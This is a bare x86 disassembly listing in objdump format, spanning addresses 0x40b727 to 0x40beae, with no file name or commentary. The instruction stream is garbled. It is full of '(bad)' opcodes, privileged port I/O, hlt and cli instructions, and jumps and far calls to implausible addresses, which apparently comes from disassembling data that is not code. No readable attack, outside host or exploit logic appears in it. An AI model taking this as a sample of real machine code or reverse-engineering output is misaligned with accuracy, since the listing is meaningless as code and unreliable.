  40b727:	jmp    0x19ed57b3
  40b72c:	sbb    al,BYTE PTR [esi-0x77]
  40b72f:	inc    ebx
  40b730:	and    ebp,DWORD PTR [esi+eax*1]
  40b733:	out    0x29,eax
  40b735:	(bad)  
  40b736:	jecxz  0x40b744
  40b738:	inc    esp
  40b739:	ror    DWORD PTR [edi+0x4c8cc38b],cl
  40b73f:	sbb    al,0x79
  40b741:	jbe    0x40b787
  40b743:	mov    ch,0x71
  40b745:	loop   0x40b7ab
  40b747:	in     al,0x3a
  40b749:	fcmovne st,st(2)
  40b74b:	sahf   
  40b74c:	ins    DWORD PTR es:[edi],dx
  40b74d:	sub    BYTE PTR [eax-0x29],0xfc
  40b751:	pusha  
  40b752:	jne    0x40b726
  40b754:	in     al,dx
  40b755:	dec    edx
  40b756:	out    dx,eax
  40b757:	ficom  WORD PTR [ebp+0x40]
  40b75a:	dec    esi
  40b75b:	cld    
  40b75c:	mov    ebx,0xa8b74845
  40b761:	rol    al,1
  40b763:	sbb    al,0x31
  40b765:	jmp    0x3edc01e1
  40b76a:	es inc edi
  40b76c:	adc    dl,BYTE PTR [edx-0x45]
  40b76f:	fsubr  st,st(6)
  40b771:	or     eax,0xbda85884
  40b776:	outs   dx,DWORD PTR ds:[esi]
  40b777:	je     0x40b76f
  40b779:	sub    al,BYTE PTR [ecx+0x46]
  40b77c:	xor    ch,BYTE PTR [esi-0x37ccab6b]
  40b782:	push   0xffffffa3
  40b784:	mul    DWORD PTR [ebx+0x4dd9c7ba]
  40b78a:	and    ebp,DWORD PTR [esi]
  40b78c:	lds    ebp,FWORD PTR [ecx-0x63f5424e]
  40b792:	out    0x8e,eax
  40b794:	or     eax,0x7ff03ce6
  40b799:	(bad)  
  40b79a:	hlt    
  40b79b:	mov    ds:0x73961f55,al
  40b7a0:	push   ss
  40b7a1:	xchg   ecx,edx
  40b7a3:	imul   esi,DWORD PTR [ebx+0x5604e9de],0xd9660c76
  40b7ad:	and    esp,0x86b63e9d
  40b7b3:	call   0x484c1b68
  40b7b8:	mov    al,0x1d
  40b7ba:	mov    ds:0x8d5b2e34,al
  40b7bf:	sahf   
  40b7c0:	dec    eax
  40b7c1:	sbb    al,0xfd
  40b7c3:	push   ds
  40b7c4:	call   0xda2f8e62
  40b7c9:	and    esi,DWORD PTR [ebp-0x2b]
  40b7cc:	sbb    dl,BYTE PTR [edx]
  40b7ce:	dec    ecx
  40b7cf:	rep lods eax,DWORD PTR ds:[esi]
  40b7d1:	xlat   BYTE PTR ds:[ebx]
  40b7d2:	mov    dl,0x54
  40b7d4:	scas   eax,DWORD PTR es:[edi]
  40b7d5:	fndisi(8087 only) 
  40b7d7:	jb     0x40b834
  40b7d9:	in     eax,0x8d
  40b7db:	ret    
  40b7dc:	pushf  
  40b7dd:	dec    ebx
  40b7de:	mov    bl,0xa7
  40b7e0:	cmp    eax,0x61c89981
  40b7e5:	push   edx
  40b7e6:	(bad)  
  40b7e7:	fidiv  DWORD PTR [edx+ecx*8]
  40b7ea:	imul   ecx,edi,0xbd9ad0cf
  40b7f0:	mov    WORD PTR [edi-0x56],gs
  40b7f3:	mov    ah,0x73
  40b7f5:	sbb    al,0xe6
  40b7f7:	popf   
  40b7f8:	mov    DWORD PTR [esi+0x7b],ebp
  40b7fb:	add    dh,dl
  40b7fd:	add    ecx,DWORD PTR [ebp-0x717ac859]
  40b803:	test   DWORD PTR [eax],ebx
  40b805:	ja     0x40b81e
  40b807:	ins    DWORD PTR es:[edi],dx
  40b808:	add    al,0x33
  40b80a:	jnp    0x40b7fa
  40b80c:	adc    cl,BYTE PTR [eax]
  40b80e:	lds    eax,FWORD PTR [ebx-0x101c8ab7]
  40b814:	call   0x8f5ba143
  40b819:	and    bh,BYTE PTR [ebx+0x64]
  40b81c:	pushf  
  40b81d:	call   0xa58:0x2e930e00
  40b824:	xchg   esi,eax
  40b825:	aad    0xb5
  40b827:	and    BYTE PTR [ebp-0x1f6613f2],cl
  40b82d:	pop    eax
  40b82e:	pop    ss
  40b82f:	popf   
  40b830:	sub    DWORD PTR [esi-0x62],ebp
  40b833:	mov    cl,0x2f
  40b835:	pop    ecx
  40b836:	fdivr  QWORD PTR ds:[edi+eax*1-0x4b]
  40b83b:	adc    ebx,DWORD PTR [edx+0x9d44840]
  40b841:	enter  0x3175,0x19
  40b845:	jbe    0x40b89e
  40b847:	and    DWORD PTR [edi+edx*2-0x5],esi
  40b84b:	dec    eax
  40b84c:	(bad)  
  40b84d:	mov    edi,0xe5f14f38
  40b852:	inc    ebx
  40b853:	sar    ah,0x98
  40b856:	cli    
  40b857:	enter  0x2318,0x78
  40b85b:	sbb    eax,0xbc858a84
  40b860:	dec    ecx
  40b861:	pop    ebx
  40b862:	xchg   ecx,eax
  40b863:	add    DWORD PTR [eax+0x61b7b3bb],ebp
  40b869:	lods   eax,DWORD PTR ds:[esi]
  40b86a:	(bad)  
  40b86b:	ret    
  40b86c:	imul   esi,DWORD PTR [ecx],0xffffffc6
  40b86f:	iret   
  40b870:	lea    eax,[ebx+0x7e650a9e]
  40b876:	into   
  40b877:	and    esi,ecx
  40b879:	into   
  40b87a:	test   al,0x74
  40b87c:	popa   
  40b87d:	inc    ecx
  40b87e:	test   eax,0xa7fa8de9
  40b883:	jns    0x40b841
  40b885:	scas   al,BYTE PTR es:[edi]
  40b886:	and    esi,eax
  40b888:	iret   
  40b889:	jl     0x40b8e9
  40b88b:	xor    eax,0x3fe25c63
  40b890:	sbb    al,BYTE PTR [esi*1+0x6d1c8063]
  40b897:	test   DWORD PTR [edi-0x18056dbd],ebp
  40b89d:	pop    esp
  40b89e:	adc    ebx,DWORD PTR [edi+0x48]
  40b8a1:	cmp    BYTE PTR ss:[esi+0x1a6e3ce4],dh
  40b8a8:	(bad)  
  40b8a9:	xchg   ecx,eax
  40b8aa:	rcr    DWORD PTR [ebx+ebx*1+0x31],0x9c
  40b8af:	mul    DWORD PTR [esi+edi*2]
  40b8b2:	push   ebp
  40b8b3:	(bad)  
  40b8b4:	adc    BYTE PTR [edi],cl
  40b8b6:	hlt    
  40b8b7:	mov    ebx,esi
  40b8b9:	in     al,0x90
  40b8bb:	shr    ecx,0xb5
  40b8be:	or     al,0x72
  40b8c0:	ret    0x26f7
  40b8c3:	js     0x40b8ee
  40b8c5:	xor    DWORD PTR [ecx],eax
  40b8c7:	popa   
  40b8c8:	int3   
  40b8c9:	xor    BYTE PTR [ebx-0x54],dh
  40b8cc:	mov    dl,0x3e
  40b8ce:	mov    ebp,cs
  40b8d0:	bound  edx,QWORD PTR [ecx+ebp*8-0x8]
  40b8d4:	call   0x97ceb09c
  40b8d9:	mov    DWORD PTR [edi-0x76e5607],ebx
  40b8df:	jmp    0x661f2163
  40b8e4:	aas    
  40b8e5:	inc    esi
  40b8e6:	aad    0x59
  40b8e8:	lods   al,BYTE PTR ds:[esi]
  40b8e9:	mov    al,0x9f
  40b8eb:	and    bl,BYTE PTR [ebx+0x5c]
  40b8ee:	push   ebx
  40b8ef:	inc    ebp
  40b8f0:	mov    ecx,0x5397b902
  40b8f5:	stos   BYTE PTR es:[edi],al
  40b8f6:	jmp    0xb4ca:0x9c447230
  40b8fd:	cmp    esp,0xffffffd6
  40b900:	test   eax,0x45e9ed5f
  40b905:	mov    dh,0xc4
  40b907:	dec    edi
  40b908:	bound  eax,QWORD PTR [esi-0x3b694ff9]
  40b90e:	test   DWORD PTR [ecx-0xf4f12b6],edx
  40b914:	mov    ebx,0xcfbc6b4f
  40b919:	fnstsw WORD PTR [ebx+0x24]
  40b91c:	lahf   
  40b91d:	jae    0x40b901
  40b91f:	cmp    al,0x69
  40b921:	add    BYTE PTR [esi+eax*4-0x51],0xed
  40b926:	test   eax,0x4eda225f
  40b92b:	and    al,0xaf
  40b92d:	push   0x3
  40b92f:	lea    esi,[edi-0x17417a60]
  40b935:	adc    ecx,DWORD PTR [eax+edx*8]
  40b938:	ds dec ebp
  40b93a:	lods   eax,DWORD PTR ds:[esi]
  40b93b:	add    DWORD PTR [esi],esi
  40b93d:	dec    esi
  40b93e:	paddd  mm6,QWORD PTR [ebx+ecx*1]
  40b942:	pop    edx
  40b943:	test   al,0x25
  40b945:	cmp    eax,0x760f3495
  40b94a:	push   esp
  40b94b:	jmp    0x40b947
  40b94d:	push   ebp
  40b94e:	jg     0x40b93f
  40b950:	popa   
  40b951:	dec    esi
  40b952:	shl    dl,0x29
  40b955:	lds    esi,FWORD PTR [bp+si]
  40b958:	jb     0x40b8de
  40b95a:	xor    bl,BYTE PTR [edx+ebx*4]
  40b95d:	hlt    
  40b95e:	into   
  40b95f:	xchg   DWORD PTR [ecx-0x70f6300],edi
  40b965:	data16 test BYTE PTR [ebp+0x41e5342b],bh
  40b96c:	sub    eax,0x630ae714
  40b971:	das    
  40b972:	je     0x40b926
  40b974:	inc    ebx
  40b975:	sub    eax,0xf5edf12e
  40b97a:	pushf  
  40b97b:	in     al,0xb6
  40b97d:	adc    bh,BYTE PTR [edx-0x5d1c1329]
  40b983:	add    ah,BYTE PTR [edi]
  40b985:	pop    eax
  40b986:	rcl    BYTE PTR [esi+0x7d4dc8aa],cl
  40b98c:	add    bl,0x35
  40b98f:	push   ebx
  40b990:	lea    edi,[ebp-0x76]
  40b993:	js     0x40b9dc
  40b995:	sbb    DWORD PTR [ecx-0x69],esi
  40b998:	xchg   ebp,eax
  40b999:	dec    ecx
  40b99a:	pop    esp
  40b99b:	jb     0x40b93d
  40b99d:	and    eax,0x79a9d14b
  40b9a2:	mov    eax,ds:0x72d7d4fa
  40b9a7:	cmp    al,0x7
  40b9a9:	jae    0x40b978
  40b9ab:	and    al,0xe7
  40b9ad:	inc    edi
  40b9ae:	xchg   ebp,eax
  40b9af:	hlt    
  40b9b0:	mov    ch,0xe6
  40b9b2:	sahf   
  40b9b3:	shl    ecx,1
  40b9b5:	add    esi,ebp
  40b9b7:	test   al,0x24
  40b9b9:	adc    al,0xe1
  40b9bc:	mov    bl,0x1
  40b9be:	scas   al,BYTE PTR es:[edi]
  40b9bf:	pop    ecx
  40b9c0:	add    cl,ch
  40b9c2:	(bad)  [edi+0x49]
  40b9c5:	push   ds
  40b9c6:	jg     0x40b95f
  40b9c8:	mov    WORD PTR [edx+0x68286c58],ds
  40b9ce:	mov    edi,0x60271443
  40b9d3:	sub    eax,0x7546a619
  40b9d8:	fldenv [eax+edx*4-0x27]
  40b9dc:	and    BYTE PTR [esi+0x23e41579],al
  40b9e2:	int    0x4b
  40b9e4:	inc    DWORD PTR [eax-0x200c11f]
  40b9ea:	xchg   ebp,eax
  40b9eb:	mov    ch,0xaa
  40b9ed:	outs   dx,DWORD PTR ds:[esi]
  40b9ee:	jge    0x40b9d9
  40b9f0:	ret    
  40b9f1:	cmp    bh,0x75
  40b9f4:	data16 aaa 
  40b9f6:	pop    es
  40b9f7:	jno    0x40b9fb
  40b9f9:	into   
  40b9fa:	jnp    0x40ba6a
  40b9fc:	clc    
  40b9fd:	jb     0x40ba21
  40b9ff:	ins    DWORD PTR es:[edi],dx
  40ba00:	ror    ebx,1
  40ba02:	mov    eax,ds:0x48fa5434
  40ba07:	popa   
  40ba08:	ror    BYTE PTR [edi+0x49ef760c],cl
  40ba0e:	and    al,BYTE PTR [eax-0x42]
  40ba11:	push   esp
  40ba12:	xchg   DWORD PTR [edi+0x4d8b6679],ebx
  40ba18:	cld    
  40ba19:	movzx  ecx,cx
  40ba1c:	add    ecx,DWORD PTR [eax]
  40ba1e:	mov    DWORD PTR [ebp-0x1c],ecx
  40ba21:	mov    eax,DWORD PTR [ebp+0xc]
  40ba24:	jmp    0x40bd71
  40ba29:	jae    0x40ba29
  40ba2b:	push   ebx
  40ba2c:	lahf   
  40ba2d:	jae    0x40baa2
  40ba2f:	jae    0x40ba83
  40ba31:	pop    edi
  40ba32:	dec    ebp
  40ba33:	scas   al,BYTE PTR es:[edi]
  40ba34:	in     al,dx
  40ba35:	mov    ecx,0x893daa72
  40ba3a:	icebp  
  40ba3b:	jle    0x40babb
  40ba3d:	cs jge 0x40babe
  40ba40:	jle    0x40ba54
  40ba42:	sbb    DWORD PTR [ecx+0x53c6f824],ebx
  40ba48:	pop    ss
  40ba49:	mov    ds:0xc30787a,eax
  40ba4e:	sbb    al,ch
  40ba50:	(bad)  
  40ba52:	rcl    DWORD PTR [ebx+0x7e],cl
  40ba55:	sbb    BYTE PTR [ebp+0x769ef51b],al
  40ba5b:	gs push es
  40ba5d:	xchg   ebp,eax
  40ba5e:	add    ebx,ecx
  40ba60:	mov    bh,0xe4
  40ba62:	ins    DWORD PTR es:[edi],dx
  40ba63:	fistp  WORD PTR [edi-0x6ff3b668]
  40ba69:	icebp  
  40ba6a:	xchg   ebp,eax
  40ba6b:	inc    ebx
  40ba6c:	(bad)  
  40ba6d:	in     eax,dx
  40ba6e:	xchg   edi,eax
  40ba6f:	mov    dh,0x26
  40ba71:	loope  0x40ba9a
  40ba73:	jmp    0x40ba00
  40ba75:	les    ebx,FWORD PTR [esp+eax*1+0x3ae16f55]
  40ba7c:	in     al,0x92
  40ba7e:	mov    ah,0xa7
  40ba80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba81:	mov    ecx,0x82a2c1ff
  40ba86:	scas   al,BYTE PTR es:[edi]
  40ba87:	add    cl,BYTE PTR [esi+0x26]
  40ba8a:	loopne 0x40baed
  40ba8c:	repz or esp,esi
  40ba8f:	(bad)  
  40ba90:	pop    ecx
  40ba91:	clc    
  40ba92:	cld    
  40ba93:	mov    edx,DWORD PTR [ebx-0x24f0c7f4]
  40ba99:	jno    0x40ba6f
  40ba9b:	mov    ebp,DWORD PTR [bp-0x39]
  40ba9f:	sub    al,0xb6
  40baa1:	inc    esi
  40baa2:	mov    fs,WORD PTR [edx]
  40baa4:	idiv   BYTE PTR [ecx-0x2a28d23b]
  40baaa:	push   0xb555e750
  40baaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bab0:	(bad)  
  40bab1:	aad    0xe
  40bab3:	(bad)  
  40bab5:	lea    ebx,[ebx+esi*2-0x31d5bd00]
  40babc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40babd:	xor    bl,bh
  40babf:	jno    0x40ba78
  40bac1:	jo     0x40ba70
  40bac3:	add    eax,0x51ece5e5
  40bac8:	enter  0x6821,0xec
  40bacc:	test   eax,0x994b6478
  40bad1:	inc    eax
  40bad2:	cmc    
  40bad3:	mov    eax,DWORD PTR [ebx-0x76a83209]
  40bad9:	mov    al,ds:0xf1900b72
  40bade:	fisttp DWORD PTR [edi+0x62]
  40bae1:	icebp  
  40bae2:	jl     0x40bb04
  40bae4:	and    bh,ch
  40bae6:	xchg   ecx,ebx
  40bae8:	clc    
  40bae9:	shl    BYTE PTR ds:0x4f60e65f,0x11
  40baf0:	and    cl,0x5b
  40baf3:	ja     0x40bac8
  40baf5:	push   edi
  40baf6:	push   ecx
  40baf7:	in     al,0x2
  40baf9:	into   
  40bafa:	adc    al,0x88
  40bafc:	call   DWORD PTR [edi]
  40bafe:	std    
  40baff:	pop    ebp
  40bb00:	xor    al,0x69
  40bb02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb03:	dec    edi
  40bb04:	dec    edx
  40bb05:	sti    
  40bb06:	pop    esi
  40bb07:	adc    eax,0xb4578e23
  40bb0c:	pextrw ebx,(bad),0xc5
  40bb0e:	pop    ebx
  40bb0f:	ret    
  40bb10:	(bad)  
  40bb11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb12:	cmp    ah,BYTE PTR [ebx-0x1aab0b24]
  40bb18:	daa    
  40bb19:	sahf   
  40bb1a:	mov    ebp,0x6493bfb8
  40bb1f:	push   es
  40bb20:	shr    dl,cl
  40bb22:	bound  eax,QWORD PTR [edx+0x5564212e]
  40bb28:	push   ebx
  40bb29:	outs   dx,DWORD PTR ds:[esi]
  40bb2a:	ds jbe 0x40bafc
  40bb2d:	in     eax,0x1d
  40bb2f:	mov    edx,0x67fe093d
  40bb34:	mov    eax,ds:0x6c888d66
  40bb39:	add    eax,0xf8e64214
  40bb3e:	(bad)  
  40bb3f:	rcl    BYTE PTR [ebp+edx*8-0x72],0xee
  40bb44:	retf   0x5e1a
  40bb47:	dec    eax
  40bb48:	jle    0x40bb37
  40bb4a:	ss jnp 0x40bb9a
  40bb4d:	fidivr DWORD PTR [eax]
  40bb4f:	ror    ch,0x41
  40bb52:	stc    
  40bb53:	(bad)  
  40bb54:	lock or ecx,esp
  40bb57:	adc    ebx,DWORD PTR [ebp+0x7921ff90]
  40bb5d:	mov    esi,DWORD PTR [eax]
  40bb5f:	imul   ecx,DWORD PTR [ecx],0xffffffee
  40bb62:	sbb    ebp,ecx
  40bb64:	mov    ebx,0x86137ebd
  40bb69:	push   esp
  40bb6a:	dec    ecx
  40bb6b:	test   BYTE PTR [esi+0xa67ea0],0x55
  40bb72:	or     esp,ebp
  40bb74:	(bad)  
  40bb75:	pop    eax
  40bb76:	cmc    
  40bb77:	mov    eax,cs
  40bb79:	mov    edi,0xe1afb55c
  40bb7e:	inc    ecx
  40bb7f:	adc    cl,BYTE PTR [edx+0x33]
  40bb82:	dec    ebp
  40bb83:	shr    ch,1
  40bb85:	dec    edi
  40bb86:	cdq    
  40bb87:	push   ss
  40bb88:	out    dx,eax
  40bb89:	retf   
  40bb8a:	pop    ss
  40bb8b:	sbb    ah,BYTE PTR [ecx+ebp*4-0x11]
  40bb8f:	ins    DWORD PTR es:[edi],dx
  40bb90:	call   0x2f47:0x4c05460b
  40bb97:	xchg   BYTE PTR ds:0x6a96bd6b,al
  40bb9d:	ret    
  40bb9e:	ror    DWORD PTR [ebp-0x5e],1
  40bba1:	hlt    
  40bba2:	dec    esi
  40bba3:	fist   WORD PTR [edi-0x26]
  40bba6:	push   ebx
  40bba7:	pusha  
  40bba8:	gs and dl,cl
  40bbab:	jecxz  0x40bba2
  40bbad:	adc    cl,BYTE PTR [ebx-0x230bd2b9]
  40bbb3:	maxps  xmm2,XMMWORD PTR [eax]
  40bbb6:	fldenv [esi]
  40bbb8:	xchg   ebx,eax
  40bbb9:	and    BYTE PTR [edi-0x79],bl
  40bbbc:	retf   0xa9aa
  40bbbf:	fcmovne st,st(2)
  40bbc1:	cmp    eax,0xd407b8cb
  40bbc6:	push   eax
  40bbc7:	sbb    DWORD PTR [ebp+0x4f],ebp
  40bbca:	stc    
  40bbcb:	movzx  esp,BYTE PTR [edx+0x64]
  40bbcf:	mov    dl,0xe1
  40bbd1:	xor    eax,0x43a3e089
  40bbd6:	jg     0x40bbfb
  40bbd8:	repnz repnz cmp esp,DWORD PTR [edx]
  40bbdc:	jns    0x40bc31
  40bbde:	xor    esi,DWORD PTR [edx-0x70]
  40bbe1:	cs push ebx
  40bbe3:	test   eax,0x265b9b18
  40bbe8:	cdq    
  40bbe9:	int    0xff
  40bbeb:	fwait
  40bbec:	shr    BYTE PTR [ebx+ebp*2-0x35],1
  40bbf0:	retf   0x3f5e
  40bbf3:	sbb    edx,DWORD PTR [edx]
  40bbf5:	cld    
  40bbf6:	mov    ecx,0x53999376
  40bbfb:	add    bh,BYTE PTR [edx*1-0x19893211]
  40bc02:	inc    ebx
  40bc03:	cmc    
  40bc04:	(bad)  
  40bc05:	jmp    0x3dbff2eb
  40bc0a:	adc    BYTE PTR [esi],dh
  40bc0c:	add    al,0xc5
  40bc0e:	bound  ebx,QWORD PTR [eax+0x76]
  40bc11:	jno    0x40bc22
  40bc13:	sbb    DWORD PTR [edi+0x10],edx
  40bc16:	pop    edi
  40bc17:	adc    DWORD PTR [ebx-0x2c11cc54],ecx
  40bc1d:	inc    edx
  40bc1e:	fsubr  st(5),st
  40bc20:	pop    esp
  40bc21:	sbb    eax,0x7dd5d5e7
  40bc26:	arpl   WORD PTR [edx+0x24],sp
  40bc29:	and    DWORD PTR [eax-0x69],0xb046f766
  40bc30:	lea    ecx,[esi+ebx*4+0x67]
  40bc34:	loop   0x40bc04
  40bc36:	call   0x42de:0xc08d7f76
  40bc3d:	jmp    0x89c8:0x612e2d06
  40bc44:	mov    al,ds:0xd5f148a9
  40bc49:	mov    edi,0xeacfb8d9
  40bc4e:	sub    esp,esi
  40bc50:	popa   
  40bc51:	repz jo 0x40bbd5
  40bc54:	(bad)  
  40bc55:	je     0x40bc0a
  40bc57:	fild   QWORD PTR [edx]
  40bc59:	cmp    BYTE PTR gs:[edx-0x4b586c02],bl
  40bc60:	push   ecx
  40bc61:	push   0xf8e620c2
  40bc66:	(bad)  
  40bc67:	popf   
  40bc68:	and    DWORD PTR [ebx],edi
  40bc6a:	stc    
  40bc6b:	mov    WORD PTR [edi+0x3b],cs
  40bc6e:	mov    ebx,0x51b86b8a
  40bc73:	cmp    DWORD PTR [edi+ebp*2],ebp
  40bc76:	xor    eax,0xde5e4b68
  40bc7b:	and    eax,0x27fd4362
  40bc80:	xchg   esi,eax
  40bc81:	adc    dl,BYTE PTR es:[eax]
  40bc84:	pusha  
  40bc85:	ja     0x40bc2c
  40bc87:	scas   eax,DWORD PTR es:[edi]
  40bc88:	sbb    ecx,ecx
  40bc8a:	bound  esi,QWORD PTR [edx+0x77]
  40bc8d:	sbb    al,0xc6
  40bc8f:	push   cs
  40bc90:	sub    BYTE PTR [edi+0x4d264f85],dh
  40bc96:	hlt    
  40bc97:	imul   ebp,DWORD PTR [edi+0x0],0xf9b2bed7
  40bc9e:	dec    esi
  40bc9f:	stos   BYTE PTR es:[edi],al
  40bca0:	jno    0x40bc42
  40bca2:	sbb    ecx,DWORD PTR [edx*2+0x674638a3]
  40bca9:	outs   dx,DWORD PTR ds:[esi]
  40bcaa:	out    0xde,al
  40bcac:	fsubr  QWORD PTR [esi+0x34]
  40bcaf:	jns    0x40bcfd
  40bcb1:	cmovp  edi,DWORD PTR [ecx+0xb0bcd7]
  40bcb8:	mov    dh,0x39
  40bcba:	pop    edx
  40bcbb:	inc    esp
  40bcbc:	repz popf 
  40bcbe:	jmp    0x40bc5a
  40bcc0:	fst    DWORD PTR [ebx+0x5905a656]
  40bcc6:	add    al,0x78
  40bcc8:	pop    ebx
  40bcc9:	push   ebx
  40bcca:	fcmovb st,st(6)
  40bccc:	sbb    eax,0x731d0f53
  40bcd1:	or     DWORD PTR [edi-0x44],ebx
  40bcd4:	icebp  
  40bcd5:	push   ss
  40bcd6:	and    edi,DWORD PTR [edx]
  40bcd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcd9:	ficom  WORD PTR [ebp-0x30e938ac]
  40bcdf:	pop    es
  40bce0:	push   es
  40bce1:	enter  0xa412,0x4c
  40bce5:	jb     0x40bd1c
  40bce7:	aaa    
  40bce8:	xlat   BYTE PTR ds:[ebx]
  40bce9:	aaa    
  40bcea:	xchg   DWORD PTR ds:0xb416de52,edi
  40bcf0:	xchg   ebp,eax
  40bcf1:	out    0xe1,eax
  40bcf3:	call   0xa903e271
  40bcf8:	in     al,0x63
  40bcfa:	shl    BYTE PTR [ecx+0x3a],cl
  40bcfd:	mov    edx,DWORD PTR [ebp+eiz*2+0x13]
  40bd01:	jge    0x40bc84
  40bd03:	out    dx,eax
  40bd04:	jg     0x40bcbd
  40bd06:	inc    ah
  40bd08:	inc    esp
  40bd09:	les    ebp,FWORD PTR [edx-0x453f45b4]
  40bd0f:	xor    DWORD PTR [edx+0x2810421e],ecx
  40bd15:	mov    WORD PTR [eax],es
  40bd17:	add    bl,BYTE PTR [edi]
  40bd19:	cli    
  40bd1a:	pop    es
  40bd1b:	and    DWORD PTR [esi-0x7229c15a],ebx
  40bd21:	outs   dx,BYTE PTR ds:[esi]
  40bd22:	gs inc edx
  40bd24:	push   cs
  40bd25:	push   es
  40bd26:	jge    0x40bd63
  40bd28:	icebp  
  40bd29:	xchg   esp,eax
  40bd2a:	push   0x72
  40bd2c:	and    DWORD PTR [eax+ebp*2],0x41
  40bd30:	add    DWORD PTR [ecx],0xbc37ed03
  40bd36:	jmp    0x40bd91
  40bd38:	mov    gs,WORD PTR [ebx-0x7c]
  40bd3b:	jge    0x40bd47
  40bd3d:	mov    esi,0xa149575d
  40bd42:	push   ebx
  40bd43:	mov    al,bh
  40bd45:	stc    
  40bd46:	and    ebp,DWORD PTR [ebx+0x5a]
  40bd49:	stc    
  40bd4a:	add    ch,BYTE PTR [esi-0x39312481]
  40bd50:	sub    ebx,DWORD PTR [ebp+0x6a]
  40bd53:	jp     0x40bda8
  40bd55:	mov    bh,0xf8
  40bd57:	mov    bh,BYTE PTR [eax]
  40bd59:	and    dh,BYTE PTR [ebp-0x25]
  40bd5c:	hlt    
  40bd5d:	leave  
  40bd5e:	sahf   
  40bd5f:	jmp    0x704b:0x564f9af5
  40bd66:	mov    ebp,ebp
  40bd68:	das    
  40bd69:	aam    0xd7
  40bd6b:	dec    esi
  40bd6c:	out    dx,al
  40bd6d:	sbb    bh,BYTE PTR [edx+eiz*4+0xc4d8bf0]
  40bd74:	xor    eax,esi
  40bd76:	add    eax,eax
  40bd78:	xor    ecx,esi
  40bd7a:	jmp    0x40c0c7
  40bd7f:	push   DWORD PTR [ebx-0xe4f1304]
  40bd85:	outs   dx,DWORD PTR ds:[esi]
  40bd86:	jno    0x40bd30
  40bd88:	mov    dh,0x9c
  40bd8a:	repnz (bad) 
  40bd8c:	iret   
  40bd8d:	mov    bh,0x9c
  40bd8f:	mov    ecx,0x2e7e7efc
  40bd94:	jge    0x40be14
  40bd96:	jle    0x40bd8c
  40bd98:	push   edx
  40bd99:	xchg   ebp,eax
  40bd9a:	cmp    al,0x1b
  40bd9c:	cmp    BYTE PTR [edx-0x28],bl
  40bd9f:	mov    ch,0xbd
  40bda1:	or     DWORD PTR [edi],ecx
  40bda3:	je     0x40bdd4
  40bda5:	(bad)  
  40bda6:	xchg   esp,eax
  40bda7:	int    0x61
  40bda9:	rcr    BYTE PTR [edi],1
  40bdab:	hlt    
  40bdac:	xlat   BYTE PTR ds:[ebx]
  40bdad:	mov    ds:0xbeab0637,al
  40bdb2:	popf   
  40bdb3:	outs   dx,DWORD PTR ds:[esi]
  40bdb4:	add    ebx,DWORD PTR [ecx-0x1201dbc2]
  40bdba:	inc    ebp
  40bdbb:	dec    eax
  40bdbc:	pushf  
  40bdbd:	cli    
  40bdbe:	inc    ebp
  40bdbf:	sahf   
  40bdc0:	addr16 cmc 
  40bdc2:	ss push 0xa9900215
  40bdc8:	test   BYTE PTR [ecx+edx*8+0xdb3de7f],0xd9
  40bdd0:	pop    eax
  40bdd1:	bound  ebp,QWORD PTR [edi-0x38]
  40bdd4:	inc    eax
  40bdd5:	mov    eax,ds:0x868f1646
  40bdda:	add    BYTE PTR [eax],bl
  40bddc:	xor    edx,DWORD PTR [edx+0x2f]
  40bddf:	mov    eax,0xf887ab40
  40bde4:	mov    ah,0x5e
  40bde6:	jo     0x40bd8a
  40bde8:	aam    0xd9
  40bdea:	sbb    BYTE PTR [edi],dh
  40bdec:	mov    ebp,0x448b5232
  40bdf1:	sbb    BYTE PTR [ebx-0x7a],dl
  40bdf4:	xchg   edx,eax
  40bdf5:	ins    BYTE PTR es:[edi],dx
  40bdf6:	mov    bh,0xcc
  40bdf8:	dec    eax
  40bdf9:	popf   
  40bdfa:	sahf   
  40bdfb:	fisubr DWORD PTR [esi]
  40bdfd:	xor    eax,0xcc8d6553
  40be02:	pusha  
  40be03:	jmp    0xb6635c21
  40be08:	push   cs
  40be09:	pusha  
  40be0a:	gs ss jmp 0x62315b82
  40be11:	pusha  
  40be12:	dec    esi
  40be13:	lea    esp,ds:0x2e7d2576
  40be19:	sbb    BYTE PTR [ecx+0x21],dl
  40be1c:	pop    edx
  40be1d:	and    DWORD PTR [eax+0xc012904],edx
  40be23:	jge    0x40bdaa
  40be25:	pop    esp
  40be26:	xor    eax,0x8f77d723
  40be2b:	add    edi,esi
  40be2d:	ja     0x40beab
  40be2f:	shl    ebx,cl
  40be31:	adc    al,0xdd
  40be33:	sbb    DWORD PTR [esi+esi*4-0x4f0be772],esp
  40be3a:	jns    0x40bdfe
  40be3c:	mov    bl,0x64
  40be3e:	pushf  
  40be3f:	jp     0x40be70
  40be41:	mov    cl,0x9d
  40be43:	call   DWORD PTR [ebx+ecx*2-0x43244d95]
  40be4a:	xor    BYTE PTR ds:0xec1ec44c,ch
  40be50:	add    al,0xc5
  40be52:	nop
  40be53:	and    bh,dl
  40be55:	push   ss
  40be56:	ins    BYTE PTR es:[edi],dx
  40be57:	loop   0x40be6e
  40be59:	cli    
  40be5a:	xor    BYTE PTR [ebp-0x6b8ec7de],cl
  40be60:	popf   
  40be61:	xor    al,0x35
  40be63:	nop
  40be64:	and    BYTE PTR [ebp-0x7a804ac6],dl
  40be6a:	ja     0x40be26
  40be6c:	psllw  mm3,QWORD PTR ds:0xb69ccecb
  40be73:	jae    0x40becb
  40be75:	repnz out 0xcf,al
  40be78:	mov    ah,0x6a
  40be7a:	inc    esp
  40be7b:	mov    al,ds:0x1d7033e4
  40be80:	ret    
  40be81:	cli    
  40be82:	adc    BYTE PTR [ebx+esi*1],dh
  40be85:	sbb    eax,0xcc2a8d66
  40be8b:	leave  
  40be8c:	mov    esp,0x5658adf6
  40be91:	jae    0x40be95
  40be93:	and    BYTE PTR [esi],0x0
  40be96:	mov    ebx,DWORD PTR [eax-0x4f]
  40be99:	lods   al,BYTE PTR ds:[esi]
  40be9a:	sub    edx,DWORD PTR [edx-0x7ecbbfcc]
  40bea0:	adc    bl,dh
  40bea2:	sahf   
  40bea3:	mov    al,0x76
  40bea5:	sbb    esp,0xffffffb7
  40bea8:	mov    ah,cl
  40beaa:	jae    0x40be9f
  40beac:	jbe    0x40beac
  40beae:	or     al,0x93
